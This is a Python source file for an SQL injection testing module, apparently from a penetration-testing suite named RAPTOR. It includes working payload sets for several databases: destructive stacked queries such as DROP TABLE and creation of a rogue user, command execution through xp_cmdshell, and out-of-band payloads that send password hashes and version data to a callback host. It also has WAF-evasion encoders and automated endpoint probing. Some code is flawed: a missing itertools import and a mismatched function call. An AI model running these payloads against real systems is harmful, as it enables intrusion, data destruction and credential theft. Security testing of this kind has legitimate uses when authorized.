#!/usr/bin/env python3
"""
RAPTOR SQL Injection Testing Module v2.0 - S-Tier Penetration Testing Suite
============================================================================
Advanced SQLi detection with multi-technique fuzzing, WAF evasion, 
database fingerprinting, and automated exploitation capabilities.
"""

import re
import time
import asyncio
import hashlib
import random
import string
from typing import List, Dict, Optional, Set, Tuple, Callable, Any, Union
from dataclasses import dataclass, field
from urllib.parse import urljoin, parse_qs, urlparse, quote, unquote
from core.base_module import BaseModule, Finding

@dataclass
class SQLiPayload:
    """Advanced SQL injection payload with evasion metadata"""
    payload: str
    technique: str  # error, boolean, time, union, stacked, oob
    db_type: str
    expected_indicator: str
    severity: str
    encoding_chain: List[str] = field(default_factory=list)
    evasion_tags: List[str] = field(default_factory=list)
    requires_specific_db: bool = False
    success_threshold: float = 0.9

@dataclass
class DBFingerprint:
    """Database fingerprinting result"""
    db_type: str
    version: Optional[str]
    techniques_available: List[str]
    privileges: List[str]
    os_info: Optional[str]
    confidence: float

class SQLiTester(BaseModule):
    """
    S-Tier SQL Injection Detection Engine
    - Multi-vector fuzzing (Error, Boolean, Time, Union, Stacked, OOB)
    - Polymorphic payload generation
    - Database-specific exploitation
    - WAF/IPS evasion techniques
    - Automated data extraction simulation
    """
    
    def __init__(self, config, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db)
        self.graph = graph_manager
        self.findings: List[Finding] = []
        
        # Configuration
        self.time_delay = config.get('sqli_blind_timeout', 10)
        self.boolean_threshold = config.get('boolean_diff_threshold', 0.05)
        self.max_union_columns = config.get('max_union_cols', 20)
        self.oob_callback = config.get('oob_callback', 'https://dns.raptor.scan')
        self.evasion_level = config.get('evasion_level', 3)
        
        # State tracking
        self.tested_params: Set[str] = set()
        self.tested_vectors: Set[str] = set()
        self.db_fingerprints: Dict[str, DBFingerprint] = {}
        self.waf_detected: bool = False
        self.response_baselines: Dict[str, Dict] = {}
        
        # Load databases
        self.payloads = self._initialize_payload_db()
        self.error_signatures = self._load_error_signatures()
        self.db_specific_tests = self._load_db_specific_tests()
        self.evasion_strategies = self._init_evasion_strategies()
        
    def _initialize_payload_db(self) -> Dict[str, Dict[str, List[SQLiPayload]]]:
        """Initialize comprehensive payload database"""
        
        # Error-based payloads with evasion variants
        error_payloads = {
            'mysql': [
                ("'", "SQL syntax.*MySQL", "High"),
                ('"', "SQL syntax.*MySQL", "High"),
                ("`", "SQL syntax", "High"),
                (")", "SQL syntax", "Medium"),
                ("'", "MySQL.*error", "High"),
                ("\\", "MySQL.*error", "High"),
                ("' AND '1'='1", "SQL syntax", "High"),
                ("' OR 'x'='x", "SQL syntax", "High"),
                ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--", "XPATH syntax error", "Critical"),
                ("' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--", "XPATH syntax error", "Critical"),
                ("' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT @@version),0x7e,'x'))s), 8436940943673152, 8436940943673152)))--", "BIGINT UNSIGNED", "Critical"),
            ],
            'postgres': [
                ("'", "PostgreSQL.*ERROR", "High"),
                ("';", "PostgreSQL", "High"),
                ("'--", "PostgreSQL", "High"),
                ("' AND 1=CAST((SELECT version()) AS INTEGER)--", "invalid input syntax", "Critical"),
                ("' AND 1=pg_sleep(0)--", "PostgreSQL", "High"),
                ("' AND (SELECT 1337 FROM (SELECT ROW(1337,666)::TEXT)::XMLTABLE('//text()' PASSING BY VALUE COLUMNS X TEXT PATH '.') WHERE X=1)--", "XMLTABLE", "High"),
            ],
            'mssql': [
                ("'", "Microsoft.*ODBC", "High"),
                ("'", "SQL Server.*Driver", "High"),
                ("'", "OLE DB.*SQL Server", "High"),
                ("';", "SQL Server", "High"),
                ("' AND 1=@@VERSION--", "nvarchar", "Critical"),
                ("' AND 1=(SELECT * FROM OPENROWSET('SQLOLEDB', 'trusted_connection=yes', 'SELECT 1'))--", "OLE DB", "High"),
                ("' AND 1=CONVERT(INT, (SELECT @@VERSION))--", "conversion failed", "Critical"),
            ],
            'oracle': [
                ("'", "ORA-[0-9]{5}", "High"),
                ("'", "Oracle error", "High"),
                ("' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE ROWNUM=1))--", "ORA-29257", "Critical"),
                ("' AND 1=CAST((SELECT banner FROM v$version WHERE ROWNUM=1) AS INT)--", "ORA-01722", "Critical"),
                ("' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--", "DRITHSX", "Critical"),
            ],
            'sqlite': [
                ("'", "SQLiteException", "High"),
                ("'", "sqlite3.OperationalError", "High"),
                ("'", "SQLite.*error", "High"),
                ("' AND sqlite_version()--", "SQLite", "High"),
                ("' AND randomblob(1000000000)--", "database or disk is full", "Critical"),
            ],
            'db2': [
                ("'", "DB2 SQL error", "High"),
                ("'", "SQLCODE", "High"),
                ("'", "SQLSTATE", "High"),
            ],
            'informix': [
                ("'", "Informix.*Error", "High"),
                ("'", "IX.*Error", "High"),
            ],
            'firebird': [
                ("'", "Dynamic SQL Error", "High"),
                ("'", "SQL error code", "High"),
            ],
            'sybase': [
                ("'", "Sybase.*Error", "High"),
                ("'", "Sybase.*driver", "High"),
            ],
            'generic': [
                ("'", "SQL syntax.*", "Medium"),
                ("'--", "syntax", "Medium"),
                ("';", "syntax", "Medium"),
                ("' AND 1=1", "syntax", "Medium"),
                ("' OR '1'='1", "syntax", "Medium"),
            ]
        }
        
        # Boolean-based blind payloads
        boolean_payloads = {
            'generic': [
                ("' AND '1'='1", "' AND '1'='2", "string_comparison"),
                ("' AND 1=1--", "' AND 1=2--", "numeric_comparison"),
                ("' AND 1=1#", "' AND 1=2#", "numeric_hash_comment"),
                ("' AND TRUE--", "' AND FALSE--", "boolean_literal"),
                ("' AND (SELECT * FROM (SELECT(SLEEP(0)))a)=0--", "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)=1--", "subquery_true_false"),
                ("' AND LENGTH('a')=1--", "' AND LENGTH('a')=2--", "length_comparison"),
                ("' AND SUBSTRING('ab',1,1)='a'--", "' AND SUBSTRING('ab',1,1)='b'--", "substring_comparison"),
            ]
        }
        
        # Time-based blind payloads
        time_payloads = {
            'mysql': [
                ("' AND SLEEP({delay})--", "delay", "High"),
                ("' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--", "delay", "High"),
                ("' AND IF(1=1,SLEEP({delay}),0)--", "delay", "High"),
                ("' AND BENCHMARK(10000000,MD5('A'))--", "cpu_intensive", "High"),
                ("' AND pg_sleep({delay})--", "delay", "High"),  # PostgreSQL syntax also works in some MySQL
            ],
            'postgres': [
                ("'; SELECT pg_sleep({delay})--", "delay", "High"),
                ("' AND (SELECT 1 FROM PG_SLEEP({delay}))--", "delay", "High"),
                ("'; SELECT CASE WHEN (1=1) THEN pg_sleep({delay}) ELSE pg_sleep(0) END--", "delay", "High"),
                ("' AND 1=(SELECT 1 FROM PG_SLEEP({delay}))--", "delay", "High"),
            ],
            'mssql': [
                ("'; WAITFOR DELAY '0:0:{delay}'--", "delay", "High"),
                ("'; IF (1=1) WAITFOR DELAY '0:0:{delay}'--", "delay", "High"),
                ("' AND 1=(SELECT 1 FROM (SELECT COUNT(*) FROM sysusers AS s1, sysusers AS s2) AS s3)--", "cpu_intensive", "High"),
            ],
            'oracle': [
                ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',{delay})--", "delay", "High"),
                ("' AND (SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3, ALL_USERS T4, ALL_USERS T5)>0 AND 1=1--", "cpu_intensive", "High"),
                ("' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT UTL_INADDR.GET_HOST_NAME('10.0.0.'||1) FROM DUAL))--", "network_delay", "High"),
            ],
            'sqlite': [
                ("' AND randomblob(1000000000)--", "cpu_delay", "High"),
                ("' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000))))--", "cpu_delay", "High"),
            ],
            'db2': [
                ("' AND (SELECT 1 FROM SYSIBM.SYSDUMMY1 WHERE 1=1 AND 1=(SELECT 1 FROM (SELECT COUNT(*) FROM SYSIBM.SYSDUMMY1 t1, SYSIBM.SYSDUMMY1 t2) t3))--", "cpu_intensive", "High"),
            ],
        }
        
        # UNION-based payloads (column enumeration)
        union_payloads = {
            'generic': [
                ("' UNION SELECT NULL--", "union_null", "Critical"),
                ("' UNION SELECT NULL,NULL--", "union_null", "Critical"),
                ("' UNION SELECT 'RAPTOR','TEST'--", "union_string", "Critical"),
                ("' UNION SELECT @@version,NULL--", "union_version", "Critical"),
                ("' UNION SELECT banner,NULL FROM v$version--", "union_oracle", "Critical"),
                ("' UNION SELECT sqlite_version(),NULL--", "union_sqlite", "Critical"),
            ]
        }
        
        # Stacked query payloads
        stacked_payloads = {
            'mysql': [
                ("'; DROP TABLE users--", "stacked", "Critical"),
                ("'; INSERT INTO users VALUES ('hacker','pass')--", "stacked", "Critical"),
                ("'; CREATE USER 'hacker'@'%' IDENTIFIED BY 'pass'--", "stacked_privilege", "Critical"),
            ],
            'postgres': [
                ("'; DROP TABLE users--", "stacked", "Critical"),
                ("'; INSERT INTO users VALUES ('hacker','pass')--", "stacked", "Critical"),
                ("'; CREATE USER hacker WITH PASSWORD 'pass'--", "stacked_privilege", "Critical"),
            ],
            'mssql': [
                ("'; DROP TABLE users--", "stacked", "Critical"),
                ("'; EXEC xp_cmdshell 'whoami'--", "stacked_rce", "Critical"),
                ("'; EXEC sp_addlogin 'hacker', 'pass'--", "stacked_privilege", "Critical"),
            ],
            'oracle': [
                ("'; BEGIN EXECUTE IMMEDIATE 'DROP TABLE users'; END;--", "stacked", "Critical"),
                ("'; DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE 'CREATE USER hacker IDENTIFIED BY pass'; END;--", "stacked_privilege", "Critical"),
            ],
        }
        
        # Out-of-band (OOB) payloads
        oob_payloads = {
            'mysql': [
                ("' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.{callback}\\\\a.txt'))--", "dns_exfil", "Critical"),
                ("' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM mysql.user LIMIT 1),'.{callback}\\\\a.txt')))--", "dns_exfil_data", "Critical"),
            ],
            'postgres': [
                ("'; COPY (SELECT '') TO PROGRAM 'nslookup {callback}'--", "dns_exfil", "Critical"),
                ("'; SELECT * FROM dblink('host={callback} user=test', 'SELECT 1')--", "dns_exfil", "Critical"),
            ],
            'mssql': [
                ("'; EXEC master..xp_dirtree '\\\\{callback}\\test'--", "dns_exfil", "Critical"),
                ("'; EXEC master..xp_fileexist '\\\\{callback}\\test'--", "dns_exfil", "Critical"),
            ],
            'oracle': [
                ("' AND UTL_HTTP.REQUEST('http://{callback}/'||(SELECT banner FROM v$version WHERE ROWNUM=1))=1--", "http_exfil", "Critical"),
                ("' AND UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1)||'.{callback}')=1--", "dns_exfil", "Critical"),
            ],
        }
        
        # Convert to SQLiPayload objects
        payload_db = {
            'error': {},
            'boolean': {},
            'time': {},
            'union': {},
            'stacked': {},
            'oob': {}
        }
        
        for db_type, payloads in error_payloads.items():
            payload_db['error'][db_type] = [
                SQLiPayload(p, 'error', db_type, ind, sev) 
                for p, ind, sev in payloads
            ]
        
        for db_type, payloads in boolean_payloads.items():
            payload_db['boolean'][db_type] = [
                SQLiPayload(p_true, 'boolean', db_type, f"{p_false}|{indicator}", sev)
                for p_true, p_false, indicator in payloads
            ]
        
        for db_type, payloads in time_payloads.items():
            payload_db['time'][db_type] = [
                SQLiPayload(p, 'time', db_type, ind, sev)
                for p, ind, sev in payloads
            ]
        
        for db_type, payloads in union_payloads.items():
            payload_db['union'][db_type] = [
                SQLiPayload(p, 'union', db_type, ind, sev)
                for p, ind, sev in payloads
            ]
        
        for db_type, payloads in stacked_payloads.items():
            payload_db['stacked'][db_type] = [
                SQLiPayload(p, 'stacked', db_type, ind, sev, evasion_tags=['stacked_query'])
                for p, ind, sev in payloads
            ]
        
        for db_type, payloads in oob_payloads.items():
            payload_db['oob'][db_type] = [
                SQLiPayload(p, 'oob', db_type, ind, sev, evasion_tags=['out_of_band'])
                for p, ind, sev in payloads
            ]
        
        return payload_db
    
    def _load_error_signatures(self) -> Dict[str, List[str]]:
        """Load comprehensive error signatures"""
        return {
            'mysql': [
                r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySqlClient\.",
                r"valid MySQL result", r"MySqlException", r"SQLSTATE\[\d+\]: Syntax error",
                r"mysqli_fetch", r"mysqli_", r"PDOException.*SQLSTATE",
            ],
            'postgres': [
                r"PostgreSQL.*ERROR", r"Warning.*pg_.*", r"Npgsql\.",
                r"PG::Error", r"PSQLException", r"org.postgresql.util.PSQLException",
            ],
            'mssql': [
                r"Microsoft.*ODBC.*SQL", r"SQL Server.*Driver", r"\[SQL Server\]",
                r"ODBC SQL Server Driver", r"SQLServer JDBC Driver", r"SqlException",
                r"System.Data.SqlClient.SqlException", r"Unclosed quotation mark",
            ],
            'oracle': [
                r"ORA-[0-9]{5}", r"Oracle error", r"Oracle.*Driver",
                r"Warning.*oci_.*", r"quoted string not properly terminated",
                r"SQL command not properly ended", r"OracleException",
            ],
            'sqlite': [
                r"SQLiteException", r"sqlite3.OperationalError", r"SQLite.*error",
                r"Warning.*sqlite_.*", r"not a valid SQLite result",
            ],
            'db2': [
                r"DB2 SQL error", r"SQLCODE", r"SQLSTATE", r"ibm_db_dbi.Error",
            ],
            'informix': [
                r"Informix.*Error", r"IX.*Error", r"Exception.*Informix",
            ],
            'firebird': [
                r"Dynamic SQL Error", r"SQL error code", r"Firebird.*Error",
            ],
            'sybase': [
                r"Sybase.*Error", r"Sybase.*driver", r"SybSQLException",
            ],
            'generic': [
                r"SQL syntax.*", r"syntax error.*SQL", r"unexpected.*SQL",
                r"SQL.*error", r"ODBC.*error", r"JDBC.*error",
            ]
        }
    
    def _load_db_specific_tests(self) -> Dict[str, Dict[str, Any]]:
        """Load database-specific exploitation tests"""
        return {
            'mysql': {
                'version_query': "SELECT @@version",
                'user_query': "SELECT user()",
                'db_query': "SELECT database()",
                'privilege_queries': [
                    "SELECT super_priv FROM mysql.user WHERE user=user()",
                    "SELECT file_priv FROM mysql.user WHERE user=user()",
                ],
                'comment_styles': ['-- ', '#', '/*'],
                'concat_operator': 'CONCAT',
                'string_indicator': "'",
            },
            'postgres': {
                'version_query': "SELECT version()",
                'user_query': "SELECT current_user",
                'db_query': "SELECT current_database()",
                'privilege_queries': [
                    "SELECT rolsuper FROM pg_roles WHERE rolname=current_user",
                ],
                'comment_styles': ['--', '/*'],
                'concat_operator': '||',
                'string_indicator': "'",
            },
            'mssql': {
                'version_query': "SELECT @@version",
                'user_query': "SELECT SYSTEM_USER",
                'db_query': "SELECT DB_NAME()",
                'privilege_queries': [
                    "SELECT IS_SRVROLEMEMBER('sysadmin')",
                    "SELECT IS_MEMBER('db_owner')",
                ],
                'comment_styles': ['--', '/*'],
                'concat_operator': '+',
                'string_indicator': "'",
            },
            'oracle': {
                'version_query': "SELECT banner FROM v$version WHERE ROWNUM=1",
                'user_query': "SELECT user FROM dual",
                'db_query': "SELECT ORA_DATABASE_NAME FROM dual",
                'privilege_queries': [
                    "SELECT DBA_ROLE_PRIVS FROM DBA_ROLE_PRIVS WHERE GRANTEE=user",
                ],
                'comment_styles': ['--', '/*'],
                'concat_operator': '||',
                'string_indicator': "'",
            },
            'sqlite': {
                'version_query': "SELECT sqlite_version()",
                'user_query': None,
                'db_query': None,
                'privilege_queries': [],
                'comment_styles': ['--', '/*'],
                'concat_operator': '||',
                'string_indicator': "'",
            }
        }
    
    def _init_evasion_strategies(self) -> Dict[str, Callable[[str], str]]:
        """Initialize WAF evasion strategies"""
        return {
            'none': lambda x: x,
            'url_encode': lambda x: quote(x, safe=''),
            'double_url_encode': lambda x: quote(quote(x, safe=''), safe=''),
            'unicode_encode': lambda x: x.replace("'", '%u0027').replace('"', '%u0022'),
            'hex_encode': lambda x: x.replace("'", '0x27'),
            'char_encoding': lambda x: re.sub(r"'", "CHAR(39)", x),
            'comment_insertion': lambda x: re.sub(r"(SELECT|INSERT|UPDATE|DELETE)", r"/*\1*/", x, flags=re.I),
            'case_randomization': lambda x: ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in x),
            'tab_newline': lambda x: x.replace(' ', '\t').replace(',', ',\n'),
            'null_byte': lambda x: x.replace("'", '%00%27'),
            'alternative_quotes': lambda x: x.replace("'", '"') if x.count("'") % 2 == 0 else x,
        }
    
    async def run(self, target: str, **kwargs) -> List[Finding]:
        """Execute comprehensive SQL injection testing"""
        self.logger.info("🚀 RAPTOR S-Tier SQL Injection Testing Module v2.0")
        self.logger.info("=" * 60)
        
        scope = kwargs.get('scope', 'comprehensive')
        
        # Phase 1: Reconnaissance
        self.logger.info("🔍 Phase 1: Endpoint & Parameter Discovery")
        endpoints = await self._discover_endpoints(target)
        params = await self._deep_parameter_discovery(target, endpoints)
        
        # Phase 2: WAF Detection
        self.logger.info("🛡️ Phase 2: WAF/IPS Fingerprinting")
        await self._detect_waf(target)
        
        # Phase 3: Error-based Detection
        self.logger.info("🎯 Phase 3: Error-based SQLi Detection")
        await self._advanced_error_testing(target, params)
        
        # Phase 4: Boolean-based Blind
        self.logger.info("🎯 Phase 4: Boolean-based Blind SQLi")
        await self._advanced_boolean_testing(target, params)
        
        # Phase 5: Time-based Blind
        self.logger.info("⏱️ Phase 5: Time-based Blind SQLi")
        await self._advanced_time_testing(target, params)
        
        # Phase 6: UNION-based
        self.logger.info("🔗 Phase 6: UNION-based SQLi")
        await self._advanced_union_testing(target, params)
        
        # Phase 7: Stacked Queries
        if kwargs.get('aggressive', False):
            self.logger.info("💉 Phase 7: Stacked Query Testing")
            await self._stacked_query_testing(target, params)
        
        # Phase 8: Out-of-Band
        if self.oob_callback:
            self.logger.info("📡 Phase 8: Out-of-Band SQLi")
            await self._oob_testing(target, params)
        
        # Phase 9: Header-based
        self.logger.info("📋 Phase 9: Header-based Injection")
        await self._advanced_header_testing(target)
        
        # Phase 10: JSON/XML parameters
        self.logger.info("📄 Phase 10: Content-Type Specific Testing")
        await self._content_type_testing(target, endpoints)
        
        self.logger.info(f"✅ Testing complete. Total findings: {len(self.findings)}")
        return self.findings
    
    async def _discover_endpoints(self, target: str) -> List[str]:
        """Discover API endpoints and parameters"""
        endpoints = {target}
        
        # Common REST/GraphQL endpoints
        common_paths = [
            '/api', '/api/v1', '/api/v2', '/graphql', '/rest',
            '/search', '/filter', '/sort', '/query', '/execute',
            '/user', '/users', '/admin', '/login', '/auth',
            '/product', '/products', '/item', '/items',
            '/post', '/posts', '/comment', '/comments',
            '/order', '/orders', '/transaction', '/payment',
        ]
        
        try:
            resp = await self._make_request(target)
            if resp:
                body = await resp.text()
                
                # Extract links
                links = re.findall(r'(?:href|src|action)=["\']([^"\']+)["\']', body, re.I)
                for link in links:
                    full = urljoin(target, link)
                    if full.startswith(target):
                        endpoints.add(full)
                
                # Extract API endpoints from JS
                js_patterns = re.findall(r'["\'](/api/[^"\']+)["\']', body)
                endpoints.update(urljoin(target, p) for p in js_patterns)
                
                # Extract GraphQL endpoints
                if 'graphql' in body.lower():
                    endpoints.add(urljoin(target, '/graphql'))
                    
        except Exception as e:
            self.logger.debug(f"Endpoint discovery error: {e}")
        
        # Test common paths
        for path in common_paths:
            test_url = urljoin(target, path)
            try:
                resp = await self._make_request(test_url, method='HEAD')
                if resp and resp.status not in [404, 500]:
                    endpoints.add(test_url)
            except:
                pass
                
        return list(endpoints)
    
    async def _deep_parameter_discovery(self, target: str, endpoints: List[str]) -> Dict:
        """Deep parameter discovery with heuristics"""
        discovered = {
            'url_params': set(),
            'body_params': set(),
            'json_params': [],
            'xml_params': [],
            'rest_endpoints': []
        }
        
        # Parameter wordlists by category
        wordlists = {
            'id_params': ['id', 'user_id', 'product_id', 'order_id', 'item_id', 'post_id'],
            'search_params': ['q', 'search', 'query', 'keyword', 'term', 's'],
            'filter_params': ['filter', 'where', 'category', 'type', 'status', 'sort', 'order'],
            'pagination': ['page', 'limit', 'offset', 'start', 'count', 'size'],
            'data_params': ['data', 'json', 'payload', 'input', 'values'],
        }
        
        all_params = set(itertools.chain(*wordlists.values()))
        
        # Test parameter reflection
        for endpoint in endpoints[:5]:
            test_value = f"RAPTOR{random.randint(1000,9999)}"
            for param in list(all_params)[:15]:
                try:
                    test_url = f"{endpoint}?{param}={test_value}"
                    resp = await self._make_request(test_url)
                    if resp:
                        body = await resp.text()
                        if test_value in body:
                            discovered['url_params'].add(param)
                except Exception:
                    pass
        
        discovered['url_params'] = list(discovered['url_params'])
        return discovered
    
    async def _detect_waf(self, target: str):
        """Detect and fingerprint WAF/IPS"""
        test_payloads = [
            ("' AND 1=1", 'sqli_basic'),
            ("../../etc/passwd", 'path_traversal'),
            ("<script>alert(1)</script>", 'xss'),
        ]
        
        blocking_count = 0
        for payload, attack_type in test_payloads:
            try:
                test_url = f"{target}?test={quote(payload)}"
                resp = await self._make_request(test_url)
                
                if resp:
                    if resp.status in [403, 406, 501, 999]:
                        blocking_count += 1
                    body = await resp.text()
                    if any(x in body.lower() for x in ['blocked', 'waf', 'firewall', 'security']):
                        blocking_count += 1
            except Exception:
                blocking_count += 1
        
        self.waf_detected = blocking_count >= 2
        if self.waf_detected:
            self.logger.warning("   WAF/IPS detected - enabling evasion techniques")
    
    async def _advanced_error_testing(self, target: str, params: Dict):
        """Advanced error-based SQLi detection with evasion"""
        url_params = params.get('url_params', [])
        
        for param in url_params:
            if param in self.tested_params:
                continue
            
            for db_type, payloads in self.payloads['error'].items():
                for payload_obj in payloads:
                    # Apply evasion if WAF detected
                    test_payloads = self._apply_evasion(payload_obj.payload) if self.waf_detected else [payload_obj.payload]
                    
                    for test_payload in test_payloads:
                        try:
                            test_url = f"{target}?{param}={quote(test_payload)}"
                            resp = await self._make_request(test_url)
                            
                            if not resp:
                                continue
                            
                            body = await resp.text()
                            
                            if self._check_error_signatures_advanced(body, db_type):
                                fingerprint = await self._fingerprint_database(target, param, db_type)
                                self._create_advanced_finding(
                                    target, param, payload_obj, db_type, 
                                    'Error-based', body, fingerprint
                                )
                                self.tested_params.add(param)
                                break
                        except Exception as e:
                            self.logger.debug(f"Error test failed: {e}")
    
    def _apply_evasion(self, payload: str) -> List[str]:
        """Apply evasion strategies to payload"""
        variants = [payload]
        
        if self.evasion_level >= 2:
            variants.append(self.evasion_strategies['url_encode'](payload))
            variants.append(self.evasion_strategies['case_randomization'](payload))
        
        if self.evasion_level >= 3:
            variants.append(self.evasion_strategies['comment_insertion'](payload))
            variants.append(self.evasion_strategies['tab_newline'](payload))
        
        if self.evasion_level >= 4:
            variants.append(self.evasion_strategies['double_url_encode'](payload))
        
        return list(set(variants))
    
    def _check_error_signatures_advanced(self, body: str, db_type: str) -> bool:
        """Advanced error signature detection"""
        signatures = self.error_signatures.get(db_type, self.error_signatures['generic'])
        
        for signature in signatures:
            if re.search(signature, body, re.IGNORECASE):
                return True
        
        # Check for generic SQL errors
        generic_patterns = [
            r"sql syntax.*error",
            r"syntax error.*in query",
            r"unclosed quotation mark",
            r"unexpected end of sql command",
        ]
        
        for pattern in generic_patterns:
            if re.search(pattern, body, re.I):
                return True
        
        return False
    
    async def _fingerprint_database(self, target: str, param: str, suspected_db: str) -> DBFingerprint:
        """Fingerprint database version and capabilities"""
        tests = self.db_specific_tests.get(suspected_db, {})
        version = None
        techniques = []
        
        # Test version extraction
        if 'version_query' in tests:
            version_payload = f"' AND 1=CONCAT('RAPTOR',({tests['version_query']}))--"
            try:
                test_url = f"{target}?{param}={quote(version_payload)}"
                resp = await self._make_request(test_url)
                if resp:
                    body = await resp.text()
                    version_match = re.search(r'RAPTOR([\d\.]+)', body)
                    if version_match:
                        version = version_match.group(1)
            except Exception:
                pass
        
        # Test boolean-based
        if await self._test_boolean_capability(target, param):
            techniques.append('boolean')
        
        # Test time-based
        if await self._test_time_capability(target, param, suspected_db):
            techniques.append('time')
        
        # Test UNION
        if await self._test_union_capability(target, param):
            techniques.append('union')
        
        return DBFingerprint(
            db_type=suspected_db,
            version=version,
            techniques_available=techniques,
            privileges=[],
            os_info=None,
            confidence=0.9 if version else 0.7
        )
    
    async def _test_boolean_capability(self, target: str, param: str) -> bool:
        """Test if boolean-based blind is possible"""
        try:
            true_url = f"{target}?{param}=1 AND 1=1"
            false_url = f"{target}?{param}=1 AND 1=2"
            
            true_resp = await self._make_request(true_url)
            false_resp = await self._make_request(false_url)
            
            if true_resp and false_resp:
                true_body = await true_resp.text()
                false_body = await false_resp.text()
                return self._analyze_boolean_response(true_body, false_body)
        except Exception:
            pass
        return False
    
    async def _test_time_capability(self, target: str, param: str, db_type: str) -> bool:
        """Test if time-based blind is possible"""
        time_payloads = self.payloads['time'].get(db_type, [])
        if not time_payloads:
            return False
        
        payload = time_payloads[0].payload.format(delay=2)
        try:
            start = time.time()
            await self._make_request(f"{target}?{param}={quote(payload)}")
            elapsed = time.time() - start
            return elapsed >= 1.5
        except Exception:
            return False
    
    async def _test_union_capability(self, target: str, param: str) -> bool:
        """Test if UNION-based is possible"""
        try:
            test_url = f"{target}?{param}=1' UNION SELECT NULL--"
            resp = await self._make_request(test_url)
            if resp and resp.status == 200:
                return True
        except Exception:
            pass
        return False
    
    async def _advanced_boolean_testing(self, target: str, params: Dict):
        """Advanced boolean-based blind SQLi detection"""
        untested = [p for p in params.get('url_params', []) if p not in self.tested_params]
        
        for param in untested:
            try:
                # Establish baseline
                baseline_url = f"{target}?{param}=1"
                baseline_resp = await self._make_request(baseline_url)
                if not baseline_resp:
                    continue
                
                baseline_body = await baseline_resp.text()
                self.response_baselines[param] = {
                    'length': len(baseline_body),
                    'content': baseline_body
                }
                
                # Test boolean conditions
                boolean_tests = [
                    ("1 AND 1=1", "1 AND 1=2"),
                    ("1' AND '1'='1", "1' AND '1'='2"),
                    ("1' AND 1=1--", "1' AND 1=2--"),
                ]
                
                for true_cond, false_cond in boolean_tests:
                    true_url = f"{target}?{param}={quote(true_cond)}"
                    false_url = f"{target}?{param}={quote(false_cond)}"
                    
                    true_resp = await self._make_request(true_url)
                    false_resp = await self._make_request(false_url)
                    
                    if true_resp and false_resp:
                        true_body = await true_resp.text()
                        false_body = await false_resp.text()
                        
                        if self._analyze_boolean_response(baseline_body, true_body, false_body):
                            self._create_advanced_finding(
                                target, param,
                                SQLiPayload(true_cond, 'boolean', 'unknown', false_cond, 'High'),
                                'unknown', 'Boolean-based Blind', '',
                                DBFingerprint('unknown', None, ['boolean'], [], None, 0.8)
                            )
                            self.tested_params.add(param)
                            break
                            
            except Exception as e:
                self.logger.debug(f"Boolean test error: {e}")
    
    def _analyze_boolean_response(self, baseline: str, true_resp: str, false_resp: str) -> bool:
        """Advanced boolean response analysis"""
        baseline_len = len(baseline)
        true_len = len(true_resp)
        false_len = len(false_resp)
        
        # Length-based detection
        true_diff = abs(true_len - baseline_len) / baseline_len if baseline_len > 0 else 0
        false_diff = abs(false_len - baseline_len) / baseline_len if baseline_len > 0 else 0
        
        if true_diff < self.boolean_threshold and false_diff > self.boolean_threshold:
            return True
        
        # Content similarity analysis
        if baseline == true_resp and baseline != false_resp:
            return True
        
        # Check for specific indicators in true vs false
        true_indicators = ['success', 'valid', 'found', 'exists']
        false_indicators = ['error', 'invalid', 'not found', 'missing']
        
        true_score = sum(1 for ind in true_indicators if ind in true_resp.lower())
        false_score = sum(1 for ind in false_indicators if ind in false_resp.lower())
        
        if true_score > false_score:
            return True
        
        return False
    
    async def _advanced_time_testing(self, target: str, params: Dict):
        """Advanced time-based blind SQLi with database inference"""
        untested = [p for p in params.get('url_params', []) if p not in self.tested_params]
        
        for param in untested:
            detected_db = None
            
            # Test each database type
            for db_type in ['mysql', 'postgres', 'mssql', 'oracle', 'sqlite']:
                payloads = self.payloads['time'].get(db_type, [])
                if not payloads:
                    continue
                
                for payload_obj in payloads:
                    payload = payload_obj.payload.format(delay=self.time_delay)
                    
                    try:
                        start = time.time()
                        resp = await self._make_request(f"{target}?{param}={quote(payload)}")
                        elapsed = time.time() - start
                        
                        if elapsed >= self.time_delay * 0.8:
                            # Verify with short delay
                            short_payload = payload_obj.payload.format(delay=1)
                            start = time.time()
                            await self._make_request(f"{target}?{param}={quote(short_payload)}")
                            short_elapsed = time.time() - start
                            
                            if short_elapsed < 2 and elapsed >= self.time_delay * 0.8:
                                detected_db = db_type
                                self._create_advanced_finding(
                                    target, param, payload_obj, db_type,
                                    'Time-based Blind', '',
                                    DBFingerprint(db_type, None, ['time'], [], None, 0.85)
                                )
                                self.tested_params.add(param)
                                break
                    except Exception:
                        pass
                
                if detected_db:
                    break
    
    async def _advanced_union_testing(self, target: str, params: Dict):
        """Advanced UNION-based SQLi with column enumeration"""
        untested = [p for p in params.get('url_params', []) if p not in self.tested_params]
        
        for param in untested:
            # Enumerate columns
            column_count = await self._enumerate_columns(target, param)
            
            if column_count > 0:
                # Test UNION with found column count
                nulls = ','.join(['NULL'] * column_count)
                union_payload = f"1' UNION SELECT {nulls}--"
                
                try:
                    test_url = f"{target}?{param}={quote(union_payload)}"
                    resp = await self._make_request(test_url)
                    
                    if resp and resp.status == 200:
                        self._create_advanced_finding(
                            target, param,
                            SQLiPayload(union_payload, 'union', 'unknown', f'columns:{column_count}', 'Critical'),
                            'unknown', 'UNION-based', '',
                            DBFingerprint('unknown', None, ['union'], [], None, 0.9)
                        )
                        self.tested_params.add(param)
                except Exception:
                    pass
    
